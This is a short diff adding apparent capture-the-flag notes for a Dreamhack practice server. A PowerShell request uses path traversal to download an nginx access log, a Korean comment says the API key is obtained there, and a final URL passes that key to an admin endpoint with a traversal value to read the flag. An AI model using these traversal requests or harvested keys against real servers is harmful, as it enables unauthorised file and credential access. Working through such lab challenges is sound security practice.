@@ -1,0 +1,4 @@
+Invoke-WebRequest http://host3.dreamhack.games:22974/file?path=../../../var/log/nginx/nginx_access.log -OutFile test.html
+여기에서 api_key를 획득
+
+http://host3.dreamhack.games:22974/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&cmd=../../flag
